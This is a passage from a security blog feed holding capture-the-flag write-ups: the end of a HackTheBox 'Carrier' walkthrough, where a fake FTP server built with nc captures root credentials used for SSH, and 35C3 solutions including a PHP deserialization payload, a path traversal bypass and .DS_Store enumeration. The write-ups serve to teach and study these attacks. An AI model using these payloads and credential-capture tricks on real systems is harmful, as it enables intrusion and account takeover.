&lt;p&gt;There is no need to code something complicated in order to &lt;strong&gt;fake an FTP server&lt;/strong&gt;, it can be very simply done with &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt;. The &lt;strong&gt;FTP protocol uses raw telnet commands&lt;/strong&gt; so we can fake a server by &lt;strong&gt;typing response codes manually&lt;/strong&gt;. All we have to do is to reply with code &lt;strong&gt;331&lt;/strong&gt; after the user has sent his username. Then, the user will supply his &lt;strong&gt;password in plaintext&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 21
nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 21
Listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0.0.0.0] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;family 0, port 21&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Connection from &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.78.10.2] port 21 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;tcp/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; accepted &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;family 2, sport 44728&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                          
USER root
331 Follow @BoiteAKlou    &lt;span class=&quot;c&quot;&gt;# Typed manually&lt;/span&gt;
PASS BGPtelc0rout1ng

PASV

QUIT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;retrieving-the-flag&quot;&gt;Retrieving the flag&lt;/h3&gt;

&lt;p&gt;It looks like we have the &lt;strong&gt;root credentials&lt;/strong&gt; of the &lt;strong&gt;real FTP server&lt;/strong&gt;! Let’s verify this.&lt;/p&gt;

&lt;p&gt;After &lt;strong&gt;removing the ip address of the FTP server from eth2&lt;/strong&gt; and resetting the BGP configuration, we are finally able to connect to &lt;strong&gt;the real Carrier machine&lt;/strong&gt; (FTP credentials == SSH credentials).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# ip addr del 10.120.15.10/25 dev eth2
root@r1:~# ifdown eth2
ifdown eth2
root@r1:~# ifup eth2
ifup eth2
root@r1:~# ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.120.15.10
ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.120.15.10
PING 10.120.15.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.120.15.10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
64 bytes from 10.120.15.10: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.054 ms

&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.120.15.10 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0.054/0.054/0.054/0.000 ms
root@r1:~# python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
root@r1:~# ssh root@10.120.15.10
ssh root@10.120.15.10
root@10.120.15.10&lt;span class=&quot;s1&quot;&gt;'s password: BGPtelc0rout1ng

Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-24-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Mar 17 15:31:44 UTC 2019

  System load:  0.07               Users logged in:       0
  Usage of /:   40.8% of 19.56GB   IP address for ens33:  10.10.10.105
  Memory usage: 47%                IP address for lxdbr0: 10.99.64.1
  Swap usage:   1%                 IP address for lxdbr1: 10.120.15.10
  Processes:    220


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

4 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Sep  5 14:32:15 2018
root@carrier:~# ls
ls
root.txt  secretdata.txt
root@carrier:~# cat root.txt
cat root.txt
283[...]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;final-words&quot;&gt;Final words&lt;/h2&gt;

&lt;p&gt;I would like to thank &lt;strong&gt;snowscan&lt;/strong&gt;, the author of this great box. It’s pretty rare to find network-related boxes because it requires a lot of preparation and materials. However, boxes like this are very realistic and allow us to learn a lot of new skills.&lt;/p&gt;

&lt;p&gt;Thanks for reading this writeup, I hope you’ve enjoyed!&lt;/p&gt;

&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Carrier was a very interesting box where a web command injection gave access to a BGP router. After some BGP Hijacking magic, it was possible to retrieve the FTP credentials of a rich Nigerian Prince, which allowed us to read the flag stored on this FTP server…</summary></entry><entry><title type="html">35C3 CTF Writeups</title><link href="http://localhost:4000/35C3-CTF-Writeups.html" rel="alternate" type="text/html" title="35C3 CTF Writeups" /><published>2018-12-31T17:00:00+01:00</published><updated>2018-12-31T17:00:00+01:00</updated><id>http://localhost:4000/35C3-CTF-Writeups</id><content type="html" xml:base="http://localhost:4000/35C3-CTF-Writeups.html">&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/ccc-logo.gif&quot; alt=&quot;CCL logo&quot; title=&quot;CCL logo&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This weekend was held the &lt;strong&gt;35th Chaos Communication Congress (35C3)&lt;/strong&gt; as long as its excellent CTF. Hopefully, a Junior CTF was also proposed, which was way more accessible than the main CTF (at least for me :wink:). In this post, you’ll find &lt;span style=&quot;color:green;&quot;&gt;concise writeups&lt;/span&gt; of most of the challenges my team and I solved from both CTFs. &lt;br /&gt;
 &lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h2 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h2&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#main-ctf-web---php&quot; id=&quot;markdown-toc-main-ctf-web---php&quot;&gt;[Main CTF] Web - php&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#solution&quot; id=&quot;markdown-toc-solution&quot;&gt;Solution&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#junior-ctf-web---flags&quot; id=&quot;markdown-toc-junior-ctf-web---flags&quot;&gt;[Junior CTF] Web - flags&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#solution-1&quot; id=&quot;markdown-toc-solution-1&quot;&gt;Solution&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#junior-ctf-web---logged-in&quot; id=&quot;markdown-toc-junior-ctf-web---logged-in&quot;&gt;[Junior CTF] Web - logged in&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#solution-2&quot; id=&quot;markdown-toc-solution-2&quot;&gt;Solution&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#junior-ctf-web---mcdonald&quot; id=&quot;markdown-toc-junior-ctf-web---mcdonald&quot;&gt;[Junior CTF] Web - McDonald&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#solution-3&quot; id=&quot;markdown-toc-solution-3&quot;&gt;Solution&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#junior-ctf-web---notee-accessible&quot; id=&quot;markdown-toc-junior-ctf-web---notee-accessible&quot;&gt;[Junior CTF] Web - Note(e) accessible&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#solution-4&quot; id=&quot;markdown-toc-solution-4&quot;&gt;Solution&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#junior-ctf-pwn---1996&quot; id=&quot;markdown-toc-junior-ctf-pwn---1996&quot;&gt;[Junior CTF] Pwn - 1996&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#solution-5&quot; id=&quot;markdown-toc-solution-5&quot;&gt;Solution&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#junior-ctf-pwn---poet&quot; id=&quot;markdown-toc-junior-ctf-pwn---poet&quot;&gt;[Junior CTF] Pwn - poet&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#solution-6&quot; id=&quot;markdown-toc-solution-6&quot;&gt;Solution&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#junior-ctf-forensic---rare_mount&quot; id=&quot;markdown-toc-junior-ctf-forensic---rare_mount&quot;&gt;[Junior CTF] Forensic - rare_mount&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#junior-ctf-forensic---epic_mount&quot; id=&quot;markdown-toc-junior-ctf-forensic---epic_mount&quot;&gt;[Junior CTF] Forensic - epic_mount&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#junior-ctf-forensic---legendary_mount&quot; id=&quot;markdown-toc-junior-ctf-forensic---legendary_mount&quot;&gt;[Junior CTF] Forensic - legendary_mount&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;main-ctf-web---php&quot;&gt;[Main CTF] Web - php&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;PHP’s unserialization mechanism can be exceptional. Guest challenge by jvoisin.&lt;/p&gt;

  &lt;p&gt;Files at https://35c3ctf.ccc.ac/uploads/php-ff2d1f97076ff25c5d0858616c26fac7.tar. Challenge running at: nc 35.242.207.13 1&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We were given the following PHP script:&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;STDIN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/flag'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Well that was unexpected…'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here is what we can observe:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;The user input isn’t sanitized before being unserialized.&lt;/li&gt;
  &lt;li&gt;Instantiating an object of type “B” would echo the flag.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;The following serialized payload will create a B object when getting unserialized: &lt;code class=&quot;highlighter-rouge&quot;&gt;O:1:&quot;B&quot;:1:{s:4:&quot;flag&quot;}&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We can translate this payload into: “An &lt;strong&gt;O&lt;/strong&gt;bject whose name is &lt;strong&gt;1&lt;/strong&gt; char long, which has a &lt;strong&gt;s&lt;/strong&gt;tring whose name is &lt;strong&gt;flag&lt;/strong&gt; of size &lt;strong&gt;4&lt;/strong&gt;”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/php-flag.png&quot; alt=&quot;php flag&quot; title=&quot;php flag&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;junior-ctf-web---flags&quot;&gt;[Junior CTF] Web - flags&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Fun with flags: http://35.207.132.47:84&lt;/p&gt;

  &lt;p&gt;Flag is at /flag&lt;/p&gt;

  &lt;p&gt;Difficulty estimate: Easy&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Here is a screen capture of the website’s frontpage:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/flags-site.png&quot; alt=&quot;Flags frontpage&quot; title=&quot;Flags frontpage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observations:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;$lang parameter is defined by HTTP_ACCEPT_LANGUAGE header.&lt;/li&gt;
  &lt;li&gt;str_replace removes “../” but is only called once.&lt;/li&gt;
  &lt;li&gt;The output of file_get_contents is base64-encoded inside the image.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;solution-1&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;str_replace will remove “../” from the user-controlled header, but what about this string “…/./”?&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'../'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'..././'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;../&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Based on this, we can forge the following payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;..././..././..././..././..././..././..././..././flag&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'../'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'..././..././..././..././..././..././..././..././flag'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;../../../../../../../../&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;flag&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then put it in place of the HTTP_ACCEPT_LANGUAGE header with Burpsuite and we have the following result:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/code&amp;gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;data:image/jpeg;base64,MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=&quot;&lt;/span&gt; | base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
35c3_this_flag_is_the_be5t_fl4g
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;junior-ctf-web---logged-in&quot;&gt;[Junior CTF] Web - logged in&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Phew, we totally did not set up our mail server yet. This is bad news since nobody can get into their accounts at the moment… It’ll be in our next sprint. Until then, since you cannot login: enjoy our totally finished software without account.&lt;/p&gt;

  &lt;p&gt;http://35.207.132.47/&lt;/p&gt;

  &lt;p&gt;Difficulty Estimate: Easy&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We are facing a very basic website with a login functionnality asking for a username and sending a verification code. If we submit the right verification code, we get logged in. Pretty simple, right?&lt;/p&gt;

&lt;h3 id=&quot;solution-2&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;Actually, the mail sending functionnality is not implemented yet and &lt;strong&gt;the verification code is retrieved by our client with a simple API call&lt;/strong&gt;, as shown in the following screen capture:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/loggedin-code.png&quot; alt=&quot;Loggedin code&quot; title=&quot;Loggedin code&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can now submit the verification code to the appropriated field:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/loggedin-ask.png&quot; alt=&quot;Loggedin ask&quot; title=&quot;Loggedin ask&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we can read the flag inside the cookies section:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/loggedin-flag.png&quot; alt=&quot;Loggedin flag&quot; title=&quot;Loggedin flag&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;junior-ctf-web---mcdonald&quot;&gt;[Junior CTF] Web - McDonald&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Our web admin name’s “Mc Donald” and he likes apples and always forgets to throw away his apple cores..&lt;/p&gt;

  &lt;p&gt;http://35.207.132.47:85&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This webpage was empty at first but the &lt;strong&gt;robots.txt&lt;/strong&gt; file shows us the following path: &lt;code class=&quot;highlighter-rouge&quot;&gt;/backup/.DS_Store&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;.DS_Store is a macOS only file which stores attributes of its containing folder. The idea, here, is to retrieve the location of the flag with the help of .DS_Store files. Problem is that the creator of this challenge was pretty naughty and created loads of subdirectories named “a”, “b” or “c”…&lt;/p&gt;

&lt;h3 id=&quot;solution-3&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;Thanks to &lt;a href=&quot;https://digi.ninja/projects/fdb.php&quot;&gt;File Disclosure Browser&lt;/a&gt;, we could parse the .DS_Store file and extract information about the name of other files in the current folder.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaclou@Kalinka:~/CTF/2018/35C3-Junior/Web/McDonald&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;fdb/fdb.pl &lt;span class=&quot;nt&quot;&gt;--type&lt;/span&gt; ds &lt;span class=&quot;nt&quot;&gt;--filename&lt;/span&gt; ./DS_Store &lt;span class=&quot;nt&quot;&gt;--base_url&lt;/span&gt; http://35.207.91.38/backup
/.DS_Store                                                                                                                              
URL: http://35.207.91.38/backup/.DS_Store/a
URL: http://35.207.91.38/backup/.DS_Store/a    
URL: http://35.207.91.38/backup/.DS_Store/a
URL: http://35.207.91.38/backup/.DS_Store/a   
URL: http://35.207.91.38/backup/.DS_Store/b
URL: http://35.207.91.38/backup/.DS_Store/b   
URL: http://35.207.91.38/backup/.DS_Store/b
URL: http://35.207.91.38/backup/.DS_Store/b
URL: http://35.207.91.38/backup/.DS_Store/b
URL: http://35.207.91.38/backup/.DS_Store/b
URL: http://35.207.91.38/backup/.DS_Store/b
URL: http://35.207.91.38/backup/.DS_Store/b
URL: http://35.207.91.38/backup/.DS_Store/c                               
URL: http://35.207.91.38/backup/.DS_Store/c
URL: http://35.207.91.38/backup/.DS_Store/c
URL: http://35.207.91.38/backup/.DS_Store/c
URL: http://35.207.91.38/backup/.DS_Store/c
URL: http://35.207.91.38/backup/.DS_Store/c
URL: http://35.207.91.38/backup/.DS_Store/c
URL: http://35.207.91.38/backup/.DS_Store/c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To make the browsing of all the subdirectories faster, I created a small wordlist containing the strings &lt;strong&gt;“a”&lt;/strong&gt;, &lt;strong&gt;“b”&lt;/strong&gt;, &lt;strong&gt;“c”&lt;/strong&gt; and &lt;strong&gt;“.DS_Store”&lt;/strong&gt; and fed it to &lt;code class=&quot;highlighter-rouge&quot;&gt;dirb&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;out.dirb | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;200
+ http://35.207.91.38/backup/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:10244&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ http://35.207.91.38/backup/b/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:6148&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ http://35.207.91.38/backup/c/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:8196&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ http://35.207.91.38/backup/b/a/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:8196&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ http://35.207.91.38/backup/b/b/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:6148&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ http://35.207.91.38/backup/c/b/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:12292&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ http://35.207.91.38/backup/c/c/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:8196&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ http://35.207.91.38/backup/b/a/b/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:6148&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ http://35.207.91.38/backup/b/a/c/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:6148&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ http://35.207.91.38/backup/b/b/c/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:6148&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Manually exploring each &lt;strong&gt;.DS_Store&lt;/strong&gt; file revealed the presence of &lt;strong&gt;flag.txt&lt;/strong&gt; under &lt;strong&gt;http://35.207.91.38/backup/b/a/c/flag.txt&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;35c3_Appl3s_H1dden_F1l3s&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;junior-ctf-web---notee-accessible&quot;&gt;[Junior CTF] Web - Note(e) accessible&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;We love notes. They make our lifes more structured and easier to manage! In 2018 everything has to be digital, and that’s why we built our very own note-taking system using micro services: Not(e) accessible! For security reasons, we generate a random note ID and password for each note.&lt;/p&gt;

  &lt;p&gt;Recently, we received a report through our responsible disclosure program which claimed that our access control is bypassable…&lt;/p&gt;

  &lt;p&gt;http://35.207.132.47:90&lt;/p&gt;

  &lt;p&gt;Difficulty estimate: Easy-Medium&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This website allows us to create a note and to consult it with an URL of this form: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://35.207.120.163/view.php?id=6578216296439429496&amp;amp;pw=47bce5c74f589f4867dbd57e9ca9f808&lt;/code&gt; .&lt;/p&gt;

